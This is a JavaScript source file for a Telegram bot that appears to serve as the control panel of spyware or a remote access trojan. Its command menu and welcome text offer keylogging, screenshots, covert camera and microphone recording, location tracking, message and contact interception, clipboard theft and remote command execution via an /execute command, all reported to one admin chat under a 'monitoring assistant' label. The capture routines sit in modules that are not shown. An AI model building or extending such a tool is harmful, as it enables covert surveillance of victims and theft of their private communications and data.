const TelegramBot = require('node-telegram-bot-api');
const Logger = require('../utils/Logger');
const CommandHandler = require('./CommandHandler');
const KeyboardBuilder = require('./KeyboardBuilder');

class TelegramBotService {
    constructor(database, fileManager, monitoringService, notificationService) {
        this.database = database;
        this.fileManager = fileManager;
        this.monitoringService = monitoringService;
        this.notificationService = notificationService;
        this.logger = new Logger();
        
        this.bot = null;
        this.adminId = parseInt(process.env.TELEGRAM_ADMIN_ID);
        this.commandHandler = null;
        this.keyboardBuilder = new KeyboardBuilder();
        this.userSessions = new Map();
    }
    
    async start() {
        try {
            const token = process.env.TELEGRAM_BOT_TOKEN;
            if (!token) {
                throw new Error('TELEGRAM_BOT_TOKEN not configured');
            }
            
            // Initialize bot
            this.bot = new TelegramBot(token, { 
                polling: process.env.NODE_ENV !== 'production',
                webHook: process.env.NODE_ENV === 'production' ? {
                    port: process.env.PORT,
                    autoOpen: false
                } : false
            });
            
            // Set webhook for production
            if (process.env.NODE_ENV === 'production' && process.env.WEBHOOK_URL) {
                const webhookUrl = `${process.env.WEBHOOK_URL}${process.env.WEBHOOK_PATH || '/bot'}`;
                await this.bot.setWebHook(webhookUrl);
                this.logger.info(`Webhook set to: ${webhookUrl}`);
            }
            
            // Initialize command handler
            this.commandHandler = new CommandHandler(
                this.bot,
                this.database,
                this.fileManager,
                this.monitoringService
            );
            
            // Setup bot commands
            await this.setupCommands();
            
            // Setup event handlers
            this.setupEventHandlers();
            
            // Notify admin that bot is online
            await this.notifyAdmin('🟢 Bot is now online and ready!');
            
            this.logger.info('Telegram bot started successfully');
            
        } catch (error) {
            this.logger.error('Failed to start Telegram bot:', error);
            throw error;
        }
    }
    
    async setupCommands() {
        // Set bot commands
        const commands = [
            { command: 'start', description: '🚀 Start the bot' },
            { command: 'status', description: '📊 System status' },
            { command: 'screenshot', description: '📸 Take screenshot' },
            { command: 'files', description: '📁 File manager' },
            { command: 'keylog', description: '⌨️ View keylogs' },
            { command: 'sysinfo', description: '💻 System information' },
            { command: 'location', description: '📍 Get location' },
            { command: 'camera', description: '📷 Access camera' },
            { command: 'microphone', description: '🎤 Record audio' },
            { command: 'notifications', description: '🔔 View notifications' },
            { command: 'contacts', description: '📞 View contacts' },
            { command: 'messages', description: '💬 View messages' },
            { command: 'apps', description: '📱 List installed apps' },
            { command: 'wifi', description: '📶 WiFi information' },
            { command: 'clipboard', description: '📋 Get clipboard content' },
            { command: 'execute', description: '⚡ Execute command' },
            { command: 'settings', description: '⚙️ Bot settings' },
            { command: 'help', description: '❓ Show help menu' }
        ];
        
        await this.bot.setMyCommands(commands);
    }
    
    setupEventHandlers() {
        // Handle /start command
        this.bot.onText(/\/start/, async (msg) => {
            const chatId = msg.chat.id;
            const userId = msg.from.id;
            
            // Check if user is admin
            if (!this.isAdmin(userId)) {
                return this.bot.sendMessage(chatId, '⛔ Unauthorized access');
            }
            
            const welcomeMessage = `
🎯 *Advanced Monitoring Bot*

Welcome to your personal monitoring assistant!

This bot provides comprehensive system monitoring and control capabilities.

*Main Features:*
📊 Real-time system monitoring
📸 Screenshot capture
📁 File management
⌨️ Keystroke logging
📍 Location tracking
🔔 Notification monitoring
💬 Message interception
📱 App management
⚡ Command execution

Use the menu below to navigate through features.
            `;
            
            const keyboard = this.keyboardBuilder.getMainMenu();
            
            await this.bot.sendMessage(chatId, welcomeMessage, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
        });
        
        // Handle /status command
        this.bot.onText(/\/status/, async (msg) => {
            await this.commandHandler.handleStatus(msg);
        });
        
        // Handle /screenshot command  
        this.bot.onText(/\/screenshot/, async (msg) => {
            await this.commandHandler.handleScreenshot(msg);
        });
        
        // Handle /files command
        this.bot.onText(/\/files/, async (msg) => {
            await this.commandHandler.handleFileManager(msg);
        });
        
        // Handle /keylog command
        this.bot.onText(/\/keylog/, async (msg) => {
            await this.commandHandler.handleKeylog(msg);
        });
        
        // Handle /sysinfo command
        this.bot.onText(/\/sysinfo/, async (msg) => {
            await this.commandHandler.handleSystemInfo(msg);
        });
        
        // Handle /location command
        this.bot.onText(/\/location/, async (msg) => {
            await this.commandHandler.handleLocation(msg);
        });
        
        // Handle /camera command
        this.bot.onText(/\/camera/, async (msg) => {
            await this.commandHandler.handleCamera(msg);
        });
        
        // Handle /microphone command
        this.bot.onText(/\/microphone/, async (msg) => {
            await this.commandHandler.handleMicrophone(msg);
        });
        
        // Handle /notifications command
        this.bot.onText(/\/notifications/, async (msg) => {
            await this.commandHandler.handleNotifications(msg);
        });
        
        // Handle /execute command
        this.bot.onText(/\/execute (.+)/, async (msg, match) => {
            await this.commandHandler.handleExecute(msg, match[1]);
        });
        
        // Handle /settings command
        this.bot.onText(/\/settings/, async (msg) => {
            await this.commandHandler.handleSettings(msg);
        });
        
        // Handle /help command
        this.bot.onText(/\/help/, async (msg) => {
            await this.commandHandler.handleHelp(msg);
        });
        
        // Handle callback queries (inline button clicks)
        this.bot.on('callback_query', async (query) => {
            await this.handleCallbackQuery(query);
        });
        
        // Handle file uploads
        this.bot.on('document', async (msg) => {
            await this.handleFileUpload(msg);
        });
        
        // Handle photos
        this.bot.on('photo', async (msg) => {
            await this.handlePhotoUpload(msg);
        });
        
        // Handle voice messages
        this.bot.on('voice', async (msg) => {
            await this.handleVoiceMessage(msg);
        });
        
        // Handle text messages
        this.bot.on('text', async (msg) => {
            // Skip if it's a command
            if (!msg.text.startsWith('/')) {
                await this.handleTextMessage(msg);
            }
        });
    }
    
    async handleCallbackQuery(query) {
        const chatId = query.message.chat.id;
        const userId = query.from.id;
        const data = query.data;
        
        if (!this.isAdmin(userId)) {
            return this.bot.answerCallbackQuery(query.id, {
                text: 'Unauthorized',
                show_alert: true
            });
        }
        
        // Parse callback data
        const [action, ...params] = data.split(':');
        
        switch (action) {
            case 'main_menu':
                await this.showMainMenu(chatId, query.message.message_id);
                break;
                
            case 'files':
                await this.commandHandler.handleFileManagerCallback(query, params);
                break;
                
            case 'screenshot':
                await this.commandHandler.handleScreenshotCallback(query);
                break;
                
            case 'sysinfo':
                await this.commandHandler.handleSystemInfoCallback(query);
                break;
                
            case 'monitoring':
                await this.handleMonitoringCallback(query, params);
                break;
                
            case 'settings':
                await this.commandHandler.handleSettingsCallback(query, params);
                break;
                
            default:
                await this.bot.answerCallbackQuery(query.id, {
                    text: 'Unknown action',
                    show_alert: false
                });
        }
        
        // Answer callback query to remove loading state
        await this.bot.answerCallbackQuery(query.id);
    }
    
    async handleMonitoringCallback(query, params) {
        const chatId = query.message.chat.id;
        const messageId = query.message.message_id;
        const [subAction] = params;
        
        const monitoringMenu = `
🔍 *Monitoring Menu*

Select monitoring feature:
        `;
        
        const keyboard = this.keyboardBuilder.getMonitoringMenu();
        
        await this.bot.editMessageText(monitoringMenu, {
            chat_id: chatId,
            message_id: messageId,
            parse_mode: 'Markdown',
            reply_markup: keyboard
        });
    }
    
    async showMainMenu(chatId, messageId) {
        const menuText = `
🎯 *Main Menu*

Select an option:
        `;
        
        const keyboard = this.keyboardBuilder.getMainMenu();
        
        if (messageId) {
            await this.bot.editMessageText(menuText, {
                chat_id: chatId,
                message_id: messageId,
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
        } else {
            await this.bot.sendMessage(chatId, menuText, {
                parse_mode: 'Markdown',
                reply_markup: keyboard
            });
        }
    }
    
    async handleFileUpload(msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        
        if (!this.isAdmin(userId)) return;
        
        try {
            const fileId = msg.document.file_id;
            const fileName = msg.document.file_name;
            const fileSize = msg.document.file_size;
            
            // Download file
            const file = await this.bot.getFile(fileId);
            const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${file.file_path}`;
            
            // Save file to uploads
            const savedPath = await this.fileManager.saveUploadedFile(fileUrl, fileName);
            
            // Log to database
            await this.database.logActivity('file_upload', {
                fileName,
                fileSize,
                savedPath
            });
            
            await this.bot.sendMessage(chatId, `✅ File uploaded successfully!\n\n📁 Name: ${fileName}\n💾 Size: ${this.formatBytes(fileSize)}`, {
                parse_mode: 'Markdown'
            });
            
        } catch (error) {
            this.logger.error('File upload error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to upload file');
        }
    }
    
    async handlePhotoUpload(msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        
        if (!this.isAdmin(userId)) return;
        
        try {
            // Get largest photo
            const photo = msg.photo[msg.photo.length - 1];
            const fileId = photo.file_id;
            
            // Download photo
            const file = await this.bot.getFile(fileId);
            const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${file.file_path}`;
            
            // Save photo
            const fileName = `photo_${Date.now()}.jpg`;
            const savedPath = await this.fileManager.saveUploadedFile(fileUrl, fileName);
            
            await this.bot.sendMessage(chatId, '✅ Photo saved successfully!');
            
        } catch (error) {
            this.logger.error('Photo upload error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to save photo');
        }
    }
    
    async handleVoiceMessage(msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        
        if (!this.isAdmin(userId)) return;
        
        try {
            const fileId = msg.voice.file_id;
            const duration = msg.voice.duration;
            
            // Download voice message
            const file = await this.bot.getFile(fileId);
            const fileUrl = `https://api.telegram.org/file/bot${process.env.TELEGRAM_BOT_TOKEN}/${file.file_path}`;
            
            // Save voice message
            const fileName = `voice_${Date.now()}.ogg`;
            const savedPath = await this.fileManager.saveUploadedFile(fileUrl, fileName);
            
            await this.bot.sendMessage(chatId, `✅ Voice message saved!\n\n⏱ Duration: ${duration}s`);
            
        } catch (error) {
            this.logger.error('Voice message error:', error);
            await this.bot.sendMessage(chatId, '❌ Failed to save voice message');
        }
    }
    
    async handleTextMessage(msg) {
        const chatId = msg.chat.id;
        const userId = msg.from.id;
        const text = msg.text;
        
        if (!this.isAdmin(userId)) return;
        
        // Check if user is in a session
        const session = this.userSessions.get(userId);
        if (session) {
            await this.handleSessionInput(chatId, userId, text, session);
        }
    }
    
    async handleSessionInput(chatId, userId, input, session) {
        switch (session.type) {
            case 'command_execution':
                await this.commandHandler.executeCommand(chatId, input);
                this.userSessions.delete(userId);
                break;
                
            case 'file_search':
                await this.fileManager.searchFiles(chatId, input);
                break;
                
            default:
                this.userSessions.delete(userId);
        }
    }
    
    isAdmin(userId) {
        return userId === this.adminId;
    }
    
    async notifyAdmin(message, options = {}) {
        if (this.adminId && this.bot) {
            try {
                await this.bot.sendMessage(this.adminId, message, {
                    parse_mode: 'Markdown',
                    ...options
                });
            } catch (error) {
                this.logger.error('Failed to notify admin:', error);
            }
        }
    }
    
    formatBytes(bytes) {
        if (bytes === 0) return '0 Bytes';
        const k = 1024;
        const sizes = ['Bytes', 'KB', 'MB', 'GB'];
        const i = Math.floor(Math.log(bytes) / Math.log(k));
        return Math.round(bytes / Math.pow(k, i) * 100) / 100 + ' ' + sizes[i];
    }
    
    async stop() {
        if (this.bot) {
            await this.bot.stopPolling();
            this.logger.info('Telegram bot stopped');
        }
    }
}

module.exports = TelegramBotService;